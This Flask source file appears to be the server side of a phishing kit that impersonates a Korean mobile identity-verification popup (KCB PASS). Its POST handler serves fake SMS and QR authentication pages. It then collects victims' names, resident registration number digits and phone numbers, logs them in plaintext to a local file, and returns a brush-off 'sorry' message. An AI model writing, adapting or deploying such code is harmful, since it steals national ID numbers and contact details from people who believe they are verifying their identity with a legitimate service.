from flask import Blueprint, render_template, request
import logging
from dotenv import load_dotenv
import os
load_dotenv()
scheme = os.environ.get('scheme')
host = os.environ.get('host')
port = os.environ.get('port')

bp = Blueprint('index', __name__, url_prefix='/')
logger = logging.getLogger()
logger.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(message)s')

file_handler = logging.FileHandler('info.log')
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)

@bp.route('/', methods=['GET', 'POST'])
def index():
    if request.method =='GET':
        return render_template('index.html', scheme=scheme, host=host, port=port)
    elif request.method == 'POST':
        print(request.form['tc'])
        if request.form['tc'] == 'kcb.oknm.online.pass.popup.sms.cmd.mno.PS02_SmsMno011Cmd':
            return render_template('sms_auth.html', scheme=scheme, host=host, port=port)
        elif request.form['tc'] == 'kcb.oknm.online.pass.popup.push.cmd.mno.PS02_PushMno011Cmd':
            return render_template('qr_auth.html', scheme=scheme, host=host, port=port)
        elif request.form['tc'] == 'kcb.oknm.online.pass.popup.sms.cmd.mno.PS03_SmsMno021Cmd':
            # SMS submit
            name = request.form['nm']
            ssn6 = request.form['ssn6']
            ssn1 = request.form['ssn1']
            mbphn_no = request.form['mbphn_no']
            logger.info(f'name: {name}, ssn6: {ssn6}, ssn1: {ssn1}, phone#: {mbphn_no}')
            return 'sorry'
        elif request.form['tc'] == 'kcb.oknm.online.pass.popup.push.cmd.mno.PS03_PushMno021Cmd':
            # qr submit
            name = request.form['nm']
            mbphn_no = request.form['mbphn_no']
            logger.info(f'name: {name}, phone#: {mbphn_no}')
            return 'I am sorry'
        else:
            return render_template('qr_auth.html')
    else:
        return "Hello world"
